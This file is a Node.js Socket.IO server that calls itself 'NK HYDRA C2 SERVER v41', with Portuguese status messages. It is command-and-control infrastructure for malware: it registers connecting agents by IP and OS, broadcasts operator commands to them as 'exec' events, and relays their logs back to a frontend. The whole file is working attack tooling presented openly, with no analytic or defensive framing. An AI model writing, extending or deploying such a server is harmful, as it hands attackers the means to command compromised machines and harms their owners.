/* NK HYDRA C2 SERVER v41.0 (STATEFUL) */
/* SINGULARITY HIVE PROTOCOL */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => res.send('NK WARLORD C2 v41 - ONLINE'));

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    pingTimeout: 60000, 
    pingInterval: 25000,
    transports: ['websocket', 'polling'] 
}); 

// STATE MANAGEMENT
const connectedAgents = new Map();

console.log("[*] SERVIDOR INICIADO. AGUARDANDO EXERCITO...");

io.on('connection', (socket) => {
    // 1. Identify Connection Type
    const clientIp = socket.handshake.address.replace('::ffff:', '');
    console.log(`[+] NOVA CONEXAO: ${socket.id} (${clientIp})`);
    
    // 2. Send current list immediately to the new client (Frontend or Agent)
    socket.emit('status', { agents: Array.from(connectedAgents.values()) });

    // 3. Agent Identification Handler
    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            const agentId = data.id || socket.id;
            console.log(`[AGENT CONNECTED] ${agentId}`);
            
            const agentData = { 
                id: agentId, 
                ip: clientIp, 
                os: data.os || 'UNKNOWN', 
                status: 'ONLINE',
                lastSeen: Date.now()
            };
            
            // Store in memory
            connectedAgents.set(socket.id, agentData);
            
            // Broadcast update to all (Frontend updates UI)
            io.emit('status', { agents: Array.from(connectedAgents.values()) });
            io.emit('log', `[SYSTEM] AGENT LINKED: ${agentId}`);
        }
    });

    // 4. Command Relay
    socket.on('cmd', (data) => {
        console.log(`[CMD] ${data.cmd} -> ${data.target}`);
        io.emit('exec', data); 
        io.emit('log', `[C2] ORDEM ENVIADA: ${data.cmd}`);
    });

    // 5. Log Relay
    socket.on('stream_log', (data) => {
        io.emit('log', data);
    });

    // 6. Disconnect Handler
    socket.on('disconnect', (reason) => {
        if (connectedAgents.has(socket.id)) {
            const agent = connectedAgents.get(socket.id);
            console.log(`[AGENT LOST] ${agent.id} (${reason})`);
            connectedAgents.delete(socket.id);
            // Broadcast update
            io.emit('status', { agents: Array.from(connectedAgents.values()) });
            io.emit('log', `[SYSTEM] AGENT LOST: ${agent.id}`);
        }
    });
});

server.listen(process.env.PORT || 3000, () => {
    console.log(`[*] C2 LISTENING ON PORT ${process.env.PORT || 3000}`);
});
    